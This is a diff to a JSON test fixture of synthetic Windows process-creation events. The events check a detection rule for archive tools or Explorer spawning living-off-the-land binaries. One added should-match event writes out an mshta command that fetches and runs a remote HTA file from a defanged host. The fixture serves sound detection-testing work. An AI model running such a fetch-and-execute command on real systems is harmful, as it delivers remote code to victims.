@@ -1,10 +1,41 @@
 {
   "_note": "Synthetic sample events. Not real telemetry.",
   "should_match": [
-    { "EventID": 1, "ParentImage": "C:\\Program Files\\7-Zip\\7zFM.exe", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell -c exit" }
+    {
+      "EventID": 1,
+      "ParentImage": "C:\\Program Files\\7-Zip\\7zFM.exe",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell -c exit"
+    },
+    {
+      "EventID": 1,
+      "ParentImage": "C:\\Windows\\explorer.exe",
+      "Image": "C:\\Windows\\System32\\mshta.exe",
+      "CommandLine": "mshta.exe https://example[.]com/a.hta",
+      "_why": "Explorer launching mshta, as an extracted LNK does"
+    }
   ],
   "should_not_match": [
-    { "EventID": 1, "ParentImage": "C:\\Program Files\\7-Zip\\7zFM.exe", "Image": "C:\\Windows\\System32\\notepad.exe", "CommandLine": "notepad readme.txt", "_why": "child is not a LOLBin" },
-    { "EventID": 1, "ParentImage": "C:\\Windows\\System32\\services.exe", "Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd /c task", "_why": "parent is not an archive utility or Explorer" }
+    {
+      "EventID": 1,
+      "ParentImage": "C:\\Program Files\\7-Zip\\7zFM.exe",
+      "Image": "C:\\Windows\\System32\\notepad.exe",
+      "CommandLine": "notepad readme.txt",
+      "_why": "child is not a LOLBin"
+    },
+    {
+      "EventID": 1,
+      "ParentImage": "C:\\Windows\\System32\\services.exe",
+      "Image": "C:\\Windows\\System32\\cmd.exe",
+      "CommandLine": "cmd /c task",
+      "_why": "parent is not an archive utility or Explorer"
+    },
+    {
+      "EventID": 1,
+      "ParentImage": "C:\\Program Files\\WinRAR\\WinRAR.exe",
+      "Image": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
+      "CommandLine": "Acrobat.exe invoice.pdf",
+      "_why": "archive tool opening an ordinary application"
+    }
   ]
 }
